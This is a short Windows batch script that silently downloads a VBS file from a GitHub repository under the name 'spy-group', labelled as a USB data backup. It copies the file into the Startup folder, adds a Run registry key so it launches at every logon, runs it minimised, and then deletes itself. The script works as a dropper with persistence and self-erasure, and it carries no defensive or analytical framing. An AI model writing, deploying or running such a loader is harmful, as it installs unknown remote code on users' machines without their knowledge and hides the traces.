@echo off
REM Download the VBS file from GitHub (Silent Mode)
curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs --silent --output "%TEMP%\test.vbs"

REM Copy the downloaded file to the Startup folder
copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM Add test.vbs to startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestScript" /t REG_SZ /d "wscript \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs\"" /f

REM Run the VBS file in background (Prevents Freezing)
start /min wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

REM Self-delete batch file and close CMD
start /b cmd /c del "%~f0" & exit
